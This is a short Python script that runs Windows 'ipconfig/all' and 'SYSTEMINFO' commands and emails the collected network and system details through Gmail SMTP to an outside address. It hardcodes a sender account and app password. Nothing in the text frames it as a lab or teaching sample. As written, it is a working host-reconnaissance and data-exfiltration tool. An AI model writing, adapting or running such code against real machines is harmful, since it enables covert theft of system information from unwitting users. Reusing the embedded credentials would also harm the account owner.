import smtplib
import subprocess as sp
from email.mime.multipart import MIMEMultipart

from email.mime.text import MIMEText

mail_content = sp.getoutput('ipconfig/all & SYSTEMINFO')

#The mail addresses and password
sender_address = 'pytest535@gmail.com'
sender_pass = 'uniligdzzdemalzt'
receiver_address = 'abosama150@gmail.com'
#Setup the MIME
message = MIMEMultipart()
message['From'] = sender_address
message['To'] = receiver_address
message['Subject'] = 'Info'  #The subject line
#The body and the attachments for the mail
message.attach(MIMEText(mail_content, 'plain'))
#Create SMTP session for sending the mail
session = smtplib.SMTP('smtp.gmail.com', 587)  #use gmail with port
session.starttls()  #enable security
session.login(sender_address, sender_pass)  #login with mail_id and password
text = message.as_string()
session.sendmail(sender_address, receiver_address, text)
session.quit()
print('Mail Sent')